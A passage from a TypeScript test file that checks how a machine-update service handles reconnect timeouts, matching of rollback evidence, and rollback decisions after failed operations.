    await settleDispatch();
    timedOut.currentNow = new Date(now.getTime() + 11 * 60_000);
    expect((await timedOut.service().status('machine-1')).update.operation).toMatchObject({
      lastFailure: { code: 'reconnect-timeout', rollbackAvailable: true },
      state: 'recovery-required'
    });

    const rollbackEvidence = { operationId: started.operation.id, state: 'rolled-back' } as const;
    const rolledBackMachine = (
      runtime: Partial<NonNullable<MachineRecord['connector']['runtime']>> = {}
    ) => currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-rollback',
        maintenance: rollbackEvidence,
        ...runtime
      }
    } });
    for (const mismatch of [
      { buildId: 'f'.repeat(40) },
      { instanceId: 'instance-before' },
      { releaseId: 'v0.3.0' }
    ]) {
      expect(await timedOut.service().decideReconnect(rolledBackMachine(mismatch))).toBeUndefined();
      expect((await timedOut.operations.latest('machine-1'))?.state).toBe('recovery-required');
    }

    expect(await timedOut.service().decideReconnect(rolledBackMachine())).toEqual({
      action: 'rollback', operationId: started.operation.id
    });
    expect(await timedOut.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'reconnect-timeout' }, state: 'rolled-back'
    });

    const failed = new Harness();
    const failedStart = await failed.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const failedAt = failed.currentNow.toISOString();
    await failed.operations.transition({
      expectedStates: ['reconnecting'], finishedAt: failedAt, id: failedStart.operation.id,
      lastFailure: {
        at: failedAt, code: 'internal-error', message: 'Dispatch failed.',
        rollbackAvailable: true
      },
      state: 'failed', updatedAt: failedAt
    });
    const failedEvidence = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-failed-rollback',
        maintenance: { operationId: failedStart.operation.id, state: 'rolled-back' }
      }
    } });
    expect(await failed.service().decideReconnect(failedEvidence)).toBeUndefined();
    await failed.operations.transition({
      expectedStates: ['failed'], id: failedStart.operation.id,
      lastFailure: {
        at: failedAt, code: 'health-timeout', message: 'Health timed out.',
        rollbackAvailable: true
      },
      state: 'failed', updatedAt: failedAt
    });
    expect(await failed.service().decideReconnect(failedEvidence)).toEqual({
      action: 'rollback', operationId: failedStart.operation.id
    });
  });
});
